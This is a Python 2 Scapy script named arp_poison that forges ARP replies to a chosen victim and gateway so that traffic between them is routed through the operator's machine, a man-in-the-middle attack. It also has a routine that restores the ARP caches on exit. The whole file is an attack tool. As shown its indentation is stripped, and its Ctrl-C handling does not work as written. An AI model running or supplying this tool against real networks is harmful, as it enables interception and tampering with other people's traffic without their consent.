#!/usr/bin/python

from scapy.all import *
import sys
import netifaces as nif
import netifaces
import signal

#This needs to run as root.
#Usage: arp_poison <victim-ip> <target-ip> <interface>

def arpPoison(victimIP, targetIP, victimMAC, targetMAC, localMAC):
#Send the packet to the victims mac. The source of the MAC is the GW address. In the ARP field the MAC of the GW IP address is our MAC.
#additionaly we set the op to an "is-at" packet
victimARP = Ether(dst = victimMAC, src = targetMAC)/ARP(op = "is-at", hwsrc = localMAC, psrc = targetIP)

#Now we want the GW to think we are the victim.
#Send the packet to GW/TARGET the source is from the Victim. We say the MAC of the Victim is our MAC
targetARP = Ether(dst = targetMAC, src = victimMAC)/ARP(op = "is-at", hwsrc = localMAC, psrc = victimIP)

print "\nForwarding target: %s to  MAC %s"%(targetIP, localMAC)
print "Forwarding target: %s to MAC %s"%(victimIP, localMAC)

while running:
sendp(victimARP, verbose = 0, inter = 1)
sendp(targetARP, verbose = 0, inter = 1)
signal.signal(signal.SIGINT, ctrlc_handler)

def arpRestore(victimIP, targetIP, victimMAC, targetMAC):
#Reset the arp cache for added Ninja
victimARP = Ether(dst = victimMAC, src = targetMAC)/ARP(op = "is-at", hwsrc = targetMAC, psrc = targetIP)
targetARP = Ether(dst = targetMAC, src = victimMAC)/ARP(op = "is-at", hwsrc = victimMAC, psrc = victimIP)
print "\nRestoring arp caches..."

for i in range(1, 10):
sendp(victimARP, inter = 0.5)
sendp(targetARP, verbose = 0, inter = 0.5)
print "Exiting..."
sys.exit()

def ctrlc_handler(signum, frm):
#Kill the arpPoison and call the arpRestore function
running = False
arpRestore(victimIP, targetIP, victimMAC, targetMAC)

#########################################
###########Program Start!################
#########################################
try:
victimIP = sys.argv[1]
targetIP = sys.argv[2]
interface = sys.argv[3]

victimMAC = getmacbyip(victimIP)
targetMAC = getmacbyip(targetIP)

addrs = netifaces.ifaddresses(interface)
localMAC = addrs[nif.AF_LINK][0]["addr"]
except:
print "\nUsage: arp_poison <victim-ip> <target-ip> <interface>\n"

running = True
arpPoison(victimIP, targetIP, victimMAC, targetMAC, localMAC)
